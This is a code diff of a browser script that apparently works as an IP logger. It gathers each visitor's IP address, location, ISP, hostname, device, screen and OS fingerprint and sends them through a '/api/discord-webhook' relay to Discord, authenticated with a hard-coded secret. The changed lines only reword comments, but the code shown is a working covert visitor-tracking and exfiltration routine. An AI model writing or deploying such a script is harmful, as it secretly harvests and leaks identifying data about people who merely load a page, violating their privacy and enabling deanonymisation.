@@ -100,12 +100,13 @@
             languages: navigator.language,
           };
 
-          // Set up the payload for the webhook
+          // Set up the payload for the webhook, now includes your secret API key
           const payload = {
-            secret: "geniuspeople", // <-- Your API key!
+            secret: "geniuspeople",
             content: `IP Address: ${echolog.ipAddress}\nLocation: ${echolog.location}\nHostname: ${echolog.hostname}\nISP: ${echolog.isp}\nCity: ${echolog.city}\nCountry: ${echolog.country}\nCountry Code: ${echolog.countryCode}\nUser Agent: ${echolog.userAgent}\nWindow Properties: ${echolog.windowProp}\nWindow Width: ${echolog.windowWidth}\nWindow Height: ${echolog.windowHeight}\nWindow Ratio: ${echolog.windowRatio}\nScreen Width: ${echolog.screenWidth}\nScreen Height: ${echolog.screenHeight}\nScreen Ratio: ${echolog.screenRatio}\nDPI: ${echolog.DPI}\nColor Depth: ${echolog.colorDepth}\nOrientation: ${echolog.orientation}\nOrientation Angle: ${echolog.orientationAngle}\nOS: ${echolog.os}\nThreads: ${echolog.threads}\nMemory: ${echolog.memory}\nSystem Languages: ${echolog.systemLanguages}\nLanguages: ${echolog.languages}`,
           };
-          // Forward to your Vercel backend, NOT directly to Discord!
+
+          // Send to your Vercel backend, NOT Discord directly!
           fetch("/api/discord-webhook", {
             method: "POST",
             headers: {
